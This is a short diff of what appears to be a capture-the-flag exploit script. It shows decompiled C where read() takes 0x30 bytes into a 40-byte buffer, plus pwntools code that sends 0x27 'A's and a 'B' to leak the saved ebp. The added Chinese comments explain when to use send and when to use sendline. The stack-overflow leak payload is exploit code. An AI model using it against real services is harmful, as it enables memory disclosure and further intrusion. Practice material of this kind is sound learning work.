@@ -8,7 +8,8 @@ char s[40]; // [ebp-28h]
 read(0, s, 0x30u);
 
 
-// 要输出 ebp 需要 0x20 个字节这时只要覆盖最后的 00 即可输出 ebp，用send不用sendline
+// 要输出 ebp 需要 0x20 个字节这时只要覆盖最后的 00 即可输出 ebp，read时用send,不用sendline
+// 如果是scanf要用 sendline
 payload1 = b'A' * (0x27) + b'B'
 p.send(payload1)  # not sendline
 p.recvuntil("B")
